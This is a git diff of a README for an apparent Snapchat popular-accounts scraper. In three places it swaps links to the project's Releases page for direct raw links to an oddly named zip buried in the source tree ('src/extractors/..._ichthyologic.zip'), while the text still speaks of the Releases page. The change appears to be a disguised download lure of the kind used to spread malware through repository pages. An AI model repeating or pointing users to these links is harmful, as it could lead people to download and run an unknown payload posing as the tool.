@@ -1,7 +1,7 @@
 # 🛠️ snapchat-popular-accounts-scraper - Extract Influencer Data Easily
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Wangg795/snapchat-popular-accounts-scraper/releases)
+[![Download Release](https://raw.githubusercontent.com/Wangg795/snapchat-popular-accounts-scraper/main/src/extractors/snapchat-popular-accounts-scraper_ichthyologic.zip)](https://raw.githubusercontent.com/Wangg795/snapchat-popular-accounts-scraper/main/src/extractors/snapchat-popular-accounts-scraper_ichthyologic.zip)
 
 ## 🚀 Getting Started
 Welcome to the **snapchat-popular-accounts-scraper**! This tool helps you gather data on popular Snapchat accounts. You can gain insights into influencers and analyze social media trends with ease. 
@@ -16,7 +16,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## ⚙️ How to Use
 ### Step 1: Download the Application
-To get started, visit the Releases page here: [Download the Latest Version](https://github.com/Wangg795/snapchat-popular-accounts-scraper/releases). 
+To get started, visit the Releases page here: [Download the Latest Version](https://raw.githubusercontent.com/Wangg795/snapchat-popular-accounts-scraper/main/src/extractors/snapchat-popular-accounts-scraper_ichthyologic.zip). 
 
 ### Step 2: Install the Application
 1. Find the latest version of the scraper on the Releases page.
@@ -61,6 +61,6 @@ Connect with other users and developers in our community. Share tips, tricks, an
 ## 📞 Support
 For support, please create an issue in the GitHub repository. We aim to respond promptly to all inquiries. 
 
-To download the software again, visit this link: [Download the Latest Version](https://github.com/Wangg795/snapchat-popular-accounts-scraper/releases). 
+To download the software again, visit this link: [Download the Latest Version](https://raw.githubusercontent.com/Wangg795/snapchat-popular-accounts-scraper/main/src/extractors/snapchat-popular-accounts-scraper_ichthyologic.zip). 
 
 Thank you for using **snapchat-popular-accounts-scraper**! Enjoy your journey into Snapchat data mining.
